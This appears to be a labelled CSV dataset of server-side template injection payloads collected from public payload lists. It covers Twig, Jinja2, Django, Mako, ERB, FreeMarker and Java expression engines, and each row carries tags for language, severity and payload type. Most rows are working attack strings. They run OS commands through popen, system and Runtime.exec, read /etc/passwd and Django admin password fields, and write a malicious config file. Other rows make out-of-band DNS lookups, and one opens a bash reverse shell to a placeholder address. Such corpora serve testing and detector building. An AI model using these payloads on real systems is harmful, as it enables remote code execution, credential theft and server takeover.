{{_self.env.registerUndefinedFilterCallback('iterator_apply')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('forward_static_call')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('forward_static_call_array')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('register_shutdown_function')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('register_tick_function')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getFunction('include')}},{{_self.env.getfunction('S')}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getFunction('source')}},{{_self.env.getfunction('S')}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getFunction('template_from_string')}},{{_self.env.getfunction('S')}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{include('/etc/passwd')}},{{include('S')}},php,Twig,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{source('/etc/passwd')}},{{source('S')}},php,Twig,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{template_from_string(""Hello #{7*7}"")}}","{{template_from_string(""S"")}}",php,Twig,1,high,probe,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{template_from_string(""{{_self}}"")}}","{{template_from_string(""S"")}}",php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{max(array('system'),array('id'))}}","{{max(array('S'),array('S'))}}",php,Twig,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{min(array('system'),array('id'))}}","{{min(array('S'),array('S'))}}",php,Twig,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{sort(array('system','id'))}}","{{sort(array('S','S'))}}",php,Twig,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}","{{'S'.getclass().forname('S').newinstance().getenginebyname('S').eval(\""S"")}}",multi,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}","{{'S'.getclass().forname('S').newinstance().getenginebyname('S').eval(\""S""whoami\\\""S"")}}",multi,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}","{{'S'.getclass().forname('S').newinstance().getenginebyname('S').eval(\""S""netstat\\\""S"")}}",multi,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}","{{'S'.getclass().forname('S').newinstance().getenginebyname('S').eval(\""S""uname\\\""S""-a\\\""S"")}}",multi,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz
<%=(`nslookup oastify.com`)%>,<%=(`nslookupoastify.com`)%>,ruby,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
<%= system('cat /etc/passwd') %>,<%=system('S')%>,ruby,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
<%= `ls /` %>,<%=`ls/`%>,ruby,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
<%= IO.popen('ls /').readlines()  %>,<%=io.popen('S').readlines()%>,ruby,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
"<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>","<%require'S'%><%@a,@b,@c,@d=openN.popenN('S')%><%=@b.readline()%>",ruby,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
"<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>","<%require'S'%><%@a,@b,@c,@d=openN.popenN('S')%><%=@c.readline()%>",ruby,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
#{ %x|env| },#{%x|env|},ruby,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Ruby.md
{% csrf_token %} # Causes error with Jinja2,{%csrf_token%}#causeserrorwithjinjaN,python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ 7*7 }}  # Error with Django Templates,{{N*N}}#errorwithdjangotemplates,python,unknown,1,low,probe,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r,ihNvr{{N|add:N}}dNr#burppayload->ihNvrNdNr,python,unknown,1,low,probe,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ '<script>alert(3)</script>' }},{{'S'}},python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ '<script>alert(3)</script>' | safe }},{{'S'|safe}},python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ messages.storages.0.signer.key }},{{messages.storages.N.signer.key}},python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% include 'admin/base.html' %},{%include'S'%},python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% load log %}{% get_admin_log 10 as log %}{% for e in log %},{%loadlog%}{%get_admin_logNaslog%}{%foreinlog%},python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{e.user.get_username}} : {{e.user.password}}{% endfor %},{{e.user.get_username}}:{{e.user.password}}{%endfor%},python,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% get_admin_log 10 as admin_log for_user user %},{%get_admin_logNasadmin_logfor_useruser%},python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{7*'7'}} would result in 7777777,{{N*'S'}}wouldresultinN,python,unknown,1,low,probe,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{% extends ""layout.html"" %}","{%extends""S""%}",python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% block body %},{%blockbody%},python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% for user in users %},{%foruserinusers%},python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"<li><a href=""{{ user.url }}"">{{ user.username }}</a></li>","<li><ahref=""S"">{{user.username}}</a></li>",python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% endfor %},{%endfor%},python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% endblock %},{%endblock%},python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
<pre>{% debug %}</pre>,<pre>{%debug%}</pre>,python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ self.__init__.__globals__.__builtins__ }},{{self.__init__.__globals__.__builtins__}},python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{% for key, value in config.iteritems() %}","{%forkey,valueinconfig.iteritems()%}",python,unknown,1,low,enumeration,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
<dt>{{ key|e }}</dt>,<dt>{{key|e}}</dt>,python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
<dd>{{ value|e }}</dd>,<dd>{{value|e}}</dd>,python,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/tmp/flag"").read() }}","{{config.items()[N][N].__class__.__mro__[N].__subclasses__()[N](""S"").read()}}",python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ get_flashed_messages.__globals__.__builtins__.open(""/etc/passwd"").read() }}","{{get_flashed_messages.__globals__.__builtins__.open(""S"").read()}}",python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S','S').write('S')}}",python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }},{{self.__init__.__globals__.__builtins__.__import__('S').popen('S').read()}},python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }},{{self._templatereference__context.cycler.__init__.__globals__.os.popen('S').read()}},python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }},{{self._templatereference__context.joiner.__init__.__globals__.os.popen('S').read()}},python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }},{{self._templatereference__context.namespace.__init__.__globals__.os.popen('S').read()}},python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ cycler.__init__.__globals__.os.popen('id').read() }},{{cycler.__init__.__globals__.os.popen('S').read()}},python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ joiner.__init__.__globals__.os.popen('id').read() }},{{joiner.__init__.__globals__.os.popen('S').read()}},python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ namespace.__init__.__globals__.os.popen('id').read() }},{{namespace.__init__.__globals__.os.popen('S').read()}},python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ cycler.__init__.__globals__.__builtins__.getattr("""", ""x"" + cycler.__init__.__globals__.os.popen('id').read()) }} # Error-Based","{{cycler.__init__.__globals__.__builtins__.getattr(""S"",""S""+cycler.__init__.__globals__.os.popen('S').read())}}#error-based",python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ 1 / (cycler.__init__.__globals__.os.popen(""id"")._proc.wait() == 0) }} # Boolean-Based","{{N/(cycler.__init__.__globals__.os.popen(""S"")._proc.wait()==N)}}#boolean-based",python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ lipsum.__globals__[""os""].popen('id').read() }}","{{lipsum.__globals__[""S""].popen('S').read()}}",python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S','S').write('S')}}",python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ config.from_pyfile('/tmp/evilconfig.cfg') }},{{config.from_pyfile('S')}},python,unknown,1,low,enumeration,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ config['RUNCMD']('/bin/bash -c ""/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1""',shell=True) }}","{{config['S']('S',shell=true)}}",python,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}},{{self._templatereference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[N:N]).read()}},python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_","http://localhost:N/?exploit={{request|attr([request.args.usc*N,request.args.class,request.args.usc*N]|join)}}&class=class&usc=_",python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_","http://localhost:N/?exploit={{request|attr((request.args.usc*N,request.args.class,request.args.usc*N)|join)}}&class=class&usc=_",python,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_,http://localhost:N/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_,python,unknown,1,low,enumeration,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_","http://localhost:N/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_",python,unknown,1,low,enumeration,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{os.system('whoami')}},{{os.system('S')}},python,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{%import os%}{{os.system('nslookup oastify.com')}},{%importos%}{{os.system('S')}},python,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
">>> print(Template(""${self.module.cache.util.os}"").render())",">>>print(template(""S"").render())",python,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}","${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[N,N])).read()}",python,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}","<%importos%>${os.popen(str().join(chr(i)for(i)in[N,N])).read()}",python,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
${class.getClassLoader()},${class.getclassloader()},java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${class.getResource(""../../../../../index.htm"").getContent()}","${class.getresource(""S"").getcontent()}",java,unknown,1,low,introspection,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE,${'S'.getclass().forname('S').getconstructor('S'.getclass().forname('S')).newinstance('S'.getclass().forname('S').getruntime().exec('S').inputstream.readallbytes())}//renderedrce,java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE,${'S'.getclass().forname('S').valueof('S'+'S'.getclass().forname('S').getconstructor('S'.getclass().forname('S')).newinstance('S'.getclass().forname('S').getruntime().exec('S').inputstream.readallbytes()))}//error-basedrce,java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE,${N/(('S'.getclass().forname('S').getruntime().exec('S').waitfor()==N)?N:N)+'S'}//boolean-basedrce,java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE,${('S'.getclass().forname('S').getruntime().exec('S').waitfor().equals(N)?('S'.getclass().forname('S')).sleep(N):N).tostring()}//time-basedrce,java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join("" "")}","${product.getclass().getprotectiondomain().getcodesource().getlocation().touri().resolve('S').tourl().openstream().readallbytes()?join(""S"")}",java,unknown,1,low,introspection,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#{""freemarker.template.utility.Execute""?new()(""id"")}","#{""S""?new()(""S"")}",java,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${(""xx""+(""freemarker.template.utility.Execute""?new()(""id"")))?new()} // Error-Based RCE","${(""S""+(""S""?new()(""S"")))?new()}//error-basedrce",java,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${1/((freemarker.template.utility.Execute""?new()("" … && echo UniqueString"")?chop_linebreak?ends_with(""UniqueString""))?string('1','0')?eval)} // Boolean-Based RCE","${N/((freemarker.template.utility.execute""S""…&&echouniquestring""S""uniquestring""))?string('S','S')?eval)}//boolean-basedrce",java,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${""freemarker.template.utility.Execute""?new()(""id && sleep 5"")} // Time-Based RCE","${""S""?new()(""S"")}//time-basedrce",java,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
{{'a'.toUpperCase()}} would result in 'A',{{'S'.touppercase()}}wouldresultin'S',java,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
